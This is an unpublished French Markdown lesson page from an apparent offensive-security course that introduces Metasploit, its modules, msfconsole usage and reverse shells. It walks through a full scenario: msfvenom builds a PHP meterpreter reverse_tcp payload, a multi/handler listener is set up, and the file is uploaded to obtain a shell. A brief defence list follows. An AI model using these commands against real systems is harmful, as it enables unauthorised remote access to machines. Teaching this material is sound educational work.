---
layout: default  
title: metasploit  
parent: Étapes d'une attaque  
nav_order: 6  
published: false
---

# Metasploit  

**Metasploit** est l’un des frameworks d’exploitation les plus connus et les plus utilisés en cybersécurité offensive. Contrairement aux outils précédents, qui permettent d’observer, tester ou automatiser certaines attaques, Metasploit occupe une place particulière : il permet de **mettre en œuvre une exploitation complète** à partir d’une vulnérabilité identifiée.

---

Jusqu’à présent, nous avons vu comment :

- observer un système (nmap, whatweb)  
- analyser ses interactions (Burp)  
- découvrir des éléments cachés (gobuster)  
- tester des hypothèses (injections)  
- automatiser certaines attaques (sqlmap, hydra)  

---

Metasploit intervient à une étape différente.

---

Il ne cherche plus à comprendre le système.  
Il cherche à en prendre le contrôle.

---

Dans une démarche offensive, cela correspond à un changement de perspective :

> *On ne se demande plus si une vulnérabilité existe.*  
> *On se demande ce que l’on peut en faire.*

---

## Objectif  

L’objectif principal de Metasploit est de :

- exploiter une vulnérabilité  
- exécuter du code sur une cible  
- obtenir un accès au système  
- interagir avec la machine compromise  

---

Concrètement, Metasploit permet :

- d’obtenir un shell à distance  
- d’exécuter des commandes  
- de récupérer des informations système  
- d’explorer un environnement compromis  

---

👉 Metasploit transforme une vulnérabilité en **accès réel**

---

## Quand l’utiliser ?  

Metasploit n’est jamais utilisé en premier.

Il intervient uniquement lorsque :

- une vulnérabilité est identifiée  
- son exploitation est plausible  
- une entrée contrôlée est disponible  

---

Dans le cycle d’une attaque, Metasploit correspond à la phase :

> **Exploiter**

---

👉 Il dépend entièrement du travail réalisé avant.

---

## Fonctionnement  

Metasploit repose sur un concept clé : les **modules d’exploitation**.

---

Un module représente :

- une vulnérabilité connue  
- une méthode d’exploitation  
- une configuration spécifique  

---

Chaque exploitation repose sur trois éléments :

---

### 1. L’exploit  

Le code qui exploite une vulnérabilité

---

### 2. Le payload  

Le code exécuté après exploitation

---

### 3. Les paramètres  

Les informations nécessaires à l’exécution

---

👉 C’est la combinaison de ces éléments qui permet l’attaque

---

## Structure de Metasploit  

Metasploit est utilisé via une interface :

```bash
msfconsole
```

---

Dans msfconsole :

```text
use exploit/...
set ...
run
```

---

### Décomposition logique

```text
Metasploit
│
├─ exploit
│   → vulnérabilité ciblée
│
├─ payload
│   → code exécuté
│
├─ options
│   → IP, port, etc.
│
└─ execution
    → run / exploit
```

---

## Commandes principales  

### Lancer Metasploit

```bash
msfconsole
```

---

### Chercher un exploit

```bash
search php
```

---

### Utiliser un exploit

```bash
use exploit/multi/handler
```

---

### Configurer

```bash
set payload php/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
```

---

### Lancer

```bash
run
```

---

## Le concept de reverse shell  

### Principe  

👉 la cible se connecte à l’attaquant

---

### Schéma

```text
Cible → Attaquant
```

---

Permet de contourner :

- pare-feu  
- restrictions réseau  

---

## msfvenom — Génération de payloads  

### Exemple

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
```

---

### Décomposition

```text
msfvenom
│
├─ -p php/meterpreter/reverse_tcp
├─ LHOST
├─ LPORT
└─ format
```

---

👉 produit un fichier malveillant

---

## Scénario complet  

### Étape 1

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
```

---

### Étape 2

```bash
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
run
```

---

### Étape 3

- upload du fichier  
- exécution

---

### Résultat

👉 connexion entrante reçue  
👉 shell obtenu

---

## Limites  

- nécessite une vulnérabilité  
- peut être détecté  
- configuration parfois complexe  

---

## Défense associée  

- corriger les vulnérabilités  
- filtrer les uploads  
- surveiller connexions sortantes  

---

## Conclusion  

Metasploit transforme une vulnérabilité en compromission réelle.

---

> *Un outil teste.*  
> *Un outil automatise.*  
> *Metasploit exploite.* 

---

## Liens utiles
- Site officiel : [https://www.metasploit.com/](https://www.metasploit.com/)
- Documentation complète : [https://docs.metasploit.com/](https://docs.metasploit.com/)
- msfvenom : [https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
